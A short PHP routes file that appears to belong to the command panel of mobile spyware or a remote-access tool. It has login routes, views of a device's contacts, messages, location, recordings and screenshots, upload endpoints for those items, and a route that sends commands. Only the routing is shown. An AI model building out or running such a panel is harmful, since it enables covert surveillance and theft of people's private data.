<?php

require __DIR__ . '/routes.php';

$route->get('/login', fn() => $authentication->loginView());
$route->post('/login', fn() => $authentication->login());

$route->get('/logout', fn()=> $authentication->logout());

$route->get('/reset-password', fn() => $authentication->resetPasswordView());
$route->post('/reset-password', fn() => $authentication->resetPassword());

$route->get('/', fn() => $controlPanel->home());
$route->get('/contacts', fn() => $controlPanel->contacts());
$route->get('/images', fn() => $controlPanel->images());
$route->get('/installed-apps', fn() => $controlPanel->installedApps());
$route->get('/files', fn() => $controlPanel->files());
$route->get('/location', fn() => $controlPanel->location());
$route->get('/messages', fn() => $controlPanel->messages());
$route->get('/notifications', fn() => $controlPanel->notifications());
$route->get('/recordings', fn() => $controlPanel->recordings());
$route->get('/screenshots', fn() => $controlPanel->screenshots());
$route->get('/videos', fn() => $controlPanel->videos());

$route->post('/client', fn() => $controlPanel->createClient());
$route->post('/image', fn() => $controlPanel->upload('images'));
$route->post('/recording', fn() => $controlPanel->upload('recordings'));
$route->post('/screenshot', fn() => $controlPanel->upload('screenshots'));
$route->post('/video', fn() => $controlPanel->upload('videos'));
$route->post('/doc', fn() => $controlPanel->upload('documents'));

$route->post('/uploadMessage', fn() => $controlPanel->uploadMessage());
$route->post('/uploadNotification', fn() => $controlPanel->uploadNotification());
$route->post('/uploadLog', fn() => $controlPanel->uploadLog());
$route->post('/uploadRecording', fn() => $controlPanel->uploadRecording());

$route->post('/send', fn() => $controlPanel->sendCommand());

$route->submit();